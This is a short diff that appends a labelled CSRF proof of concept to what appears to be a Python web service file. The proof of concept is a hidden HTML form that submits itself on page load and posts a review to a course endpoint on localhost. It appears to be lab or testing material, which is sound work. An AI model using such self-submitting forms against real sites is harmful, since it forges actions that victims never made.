@@ -239,3 +239,17 @@ async def evaluate(request: Request):
 
 
 
+
+csrf
+
+<body>
+     <form id="csrfForm" action="http://localhost:8080/courses/1/review" method="POST" style="display:none;">
+        <textarea name="review_text">This is a CSRF attack without token!</textarea>
+    </form>
+    <script>
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        };
+    </script>
+</body>
+
